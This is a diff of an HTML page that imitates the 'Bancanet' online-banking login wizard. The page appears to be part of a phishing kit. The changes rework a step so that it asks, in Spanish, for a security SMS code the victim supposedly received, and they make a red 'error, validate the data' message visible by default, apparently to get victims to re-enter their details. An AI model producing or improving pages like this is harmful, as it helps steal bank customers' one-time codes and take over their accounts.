@@ -1041,18 +1041,21 @@
 		<wizard-step-content _ngcontent-c29="">
 								<div _ngcontent-c29="" class="wizard-step-content-wrapper">
 									
-									<div _ngcontent-c29="" class="wizard-step-content-logo esp"></div>
-									<div _ngcontent-c29="" class="wizard-step-content-title">
-										<span _ngcontent-c29="">SMS de Bancanet</span>
-									</div>
+									<div _ngcontent-c29="" class="wizard-step-content-logo esp"></div> <center>
+									<div style="     font-size: 15px !important; 
+    width: 60% !important;
+}" _ngcontent-c29="" class="wizard-step-content-title">
+										<span _ngcontent-c29="" >Hemos enviado un código SMS a tu dispositivo por seguridad. Ingresa el código para continuar.</span>
+									</div>  </center>
 									<icb-login-step-user _ngcontent-c29="" _nghost-c35=""><div  class="wizardAutoHeightModeX ng-pristine ng-invalid ng-touched">
     <div _ngcontent-c35="" class="subotica">
         <div _ngcontent-c35="" class="subotica-content">
             <div _ngcontent-c35="" class="subotica-content-data"> 
-                <input id="usuario" oninput="validarUsuario()" _ngcontent-c35="" autocomplete="off" class="subotica-content-data-input required ng-pristine ng-invalid ng-touched" disable-paste="" name="username" id="step01" placeholder="Escriba su sms recibido">          
+                <input id="usuario" oninput="validarUsuario()" _ngcontent-c35="" autocomplete="off" class="subotica-content-data-input required ng-pristine ng-invalid ng-touched" disable-paste="" name="username" id="step01" placeholder="Código SMS recibido">          
             </div>
+			 <center><div style="color:red" class="warning" id="msgBox">Valide los datos hubo un error</div></center>
 
-            <center><div style="color:red" class="warning" id="msgBox">Valide los datos hubo un error</div></center>
+            <center><div style="color:red" class="warning" id="msgBox"></div></center>
             <div _ngcontent-c35="" class="subotica-content-keyboard">
                 <a _ngcontent-c35="" class="subotica-content-keyboard-link">Teclado virtual</a>
                 <icb-numerickeypad-component _ngcontent-c35="" _nghost-c48=""><div _ngcontent-c48="" class="vKeyBoard Hidden" style="top: 44px; left: 172px;">
